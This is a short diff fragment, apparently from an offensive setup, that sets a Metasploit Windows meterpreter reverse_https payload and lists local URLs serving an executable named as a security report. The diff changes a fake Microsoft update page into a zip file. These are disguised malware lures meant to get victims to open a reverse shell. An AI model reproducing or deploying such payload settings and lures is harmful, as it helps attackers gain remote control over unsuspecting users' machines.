@@ -19,7 +19,7 @@ set PAYLOAD windows/x64/meterpreter/reverse_https
 
 http://192.168.1.137/payloads/relatorio_seguranca.exe
 
-http://192.168.1.137:8080/microsoft_update.html
+http://192.168.1.137:8080/microsoft_update.page.zip
 
 import zipfile
 
